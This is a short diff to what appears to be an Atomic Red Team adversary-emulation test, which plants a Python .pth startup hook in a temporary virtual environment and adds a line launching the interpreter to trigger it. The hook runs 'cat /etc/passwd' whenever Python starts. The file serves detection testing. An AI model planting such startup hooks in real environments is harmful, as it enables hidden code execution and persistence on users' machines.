@@ -67,6 +67,7 @@ atomic_tests:
         $PYTHON_EXE -m venv "$TEMPDIR/env"
         SITE_PACKAGES=$("$TEMPDIR/env/bin/python" -c "import site; print(site.getsitepackages()[0])")
         echo "import sys, os; (not hasattr(sys, 'hook_run')) and (setattr(sys, 'hook_run', True) or os.system('cat /etc/passwd'))" > "$SITE_PACKAGES/atomic_hook.pth"
+        "$TEMPDIR/env/bin/python" -c "print('Interpreter started')"
       cleanup_command: |
         rm -rf $(cat /tmp/atomic_python_hook_path.txt) && rm -f /tmp/atomic_python_hook_path.txt
 
